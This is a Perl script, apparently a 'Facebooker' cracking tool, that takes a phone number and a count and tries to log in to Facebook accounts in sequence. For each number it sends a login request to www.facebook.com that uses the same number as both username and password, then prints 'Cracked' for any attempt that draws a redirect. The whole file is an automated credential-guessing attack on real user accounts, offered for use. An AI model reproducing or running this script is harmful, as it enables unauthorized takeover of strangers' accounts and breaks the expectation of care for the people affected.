#!/usr/bin/perl
#

use strict;
use Net::SSLeay::Handle;

if(!defined($ARGV[0] && $ARGV[1])) {

system('clear');
print "                               Version 2.32 \n";
print "d88888b  .d8b.   .o88b. d88888b d8888b.  .d88b.  db   dD d88888b d8888b. \n";
print "88'     d8' `8b d8P  Y8 88'     88  `8D .8P  Y8. 88 ,8P' 88'     88  `8D \n";
print "88ooo   88ooo88 8P      88ooooo 88oooY' 88    88 88,8P   88ooooo 88oobY' \n";
print "88~~~   88~~~88 8b      88~~~~~ 88~~~b. 88    88 88`8b   88~~~~~ 88`8b   \n";
print "88      88   88 Y8b  d8 88.     88   8D `8b  d8' 88 `88. 88.     88 `88. \n";
print "YP      YP   YP  `Y88P' Y88888P Y8888P'  `Y88P'  YP   YD Y88888P 88   YD \n";

print "\033[1;31m          ======================================================\n";
print "\033[1;37m               Usage: perl $0 Phone Limite\n\n\n\n\n\n\n\n\n";
print "\n";
print "\n";
print "\n";
print "\n";
print "\n";
print "\n";
exit; }

my $phone = $ARGV[0];
my $myRank = $ARGV[1];



print "             Version 2.32 \n";
print "PPPPPP  HH  HH    0000    NNNN     NN  EEEEEE \n";
print "PP  PP  HH  HH  00    00  NN NN    NN  EE     \n";
print "PPPPPP  HHHHHH  00    00  NN  NN   NN  EEEEE  \n";
print "PP      HH  HH  00    00  NN   NN  NN  EE     \n";
print "PP      HH  HH  00    00  NN    NN NN  EE     \n";
print "PP      HH  HH    0000    NN     NNNN  EEEEEE \n";

print "\033[1;31m          ======================================================\n";

print "\033[1;31m          -------------------------------------------------------\n";

print "\033[1;39m\n [+] Cracking Started on Rank : $phone  Limit: $myRank...\n\n";
print "=======================================\n";

$a = 0;


# while loop execution
while( $a < $myRank ){
   	$a = $a + 1;
   	my $newPhone = $phone+$a;
	my $nUser = "0".$newPhone;
	my $nPass = "0".$newPhone;
	$nPass =~ s/([^^A-Za-z0-9\-_.!~*'()])/ sprintf "%%%0x", ord $1 /eg;

	my $a = "POST /login.php HTTP/1.1";
	my $b = "Host: www.facebook.com";
	my $c = "Connection: close";
	my $e = "Cache-Control: max-age=0";
	my $f = "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8";
	my $g = "Origin: https://www.facebook.com";
	my $h = "User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.31 (KHTML, like Gecko) Chrome/26.0.1410.63 Safari/537.31";
	my $i = "Content-Type: application/x-www-form-urlencoded";
	my $j = "Accept-Encoding: gzip,deflate,sdch";
	my $k = "Accept-Language: en-US,en;q=0.8";
	my $l = "Accept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.3";

	my $cookie = "cookie: datr=80ZzUfKqDOjwL8pauwqMjHTa";
	my $post = "lsd=AVpD2t1f&display=&enable_profile_selector=&legacy_return=1&next=&profile_selector_ids=&trynum=1&timezone=300&lgnrnd=031110_Euoh&lgnjs=1366193470&email=$nUser&pass=$nPass&default_persistent=0&login=Log+In";
	my $cl = length($post);
	my $d = "Content-Length: $cl";


	my ($host, $port) = ("www.facebook.com", 443);

	tie(*SSL, "Net::SSLeay::Handle", $host, $port);
	  

	print SSL "$a\n";
	print SSL "$b\n";
	print SSL "$c\n";
	print SSL "$d\n";
	print SSL "$e\n";
	print SSL "$f\n";
	print SSL "$g\n";
	print SSL "$h\n";
	print SSL "$i\n";
	print SSL "$j\n";
	print SSL "$k\n";
	print SSL "$l\n";
	print SSL "$cookie\n\n";

	print SSL "$post\n";

	my $success;
	my $myNewSuccess;
	while(my $result = <SSL>){
		if($result =~ /Location(.*?)/){
		$success = $1;
		$myNewSuccess.=$result;
		}
		
	}
if (!defined $success)
{
print "Fail $nPass \n";
#print "$cl \n";
close SSL;
}
else
{
print "Cracked $nPass | $myNewSuccess ";
close SSL;

}

}
exit;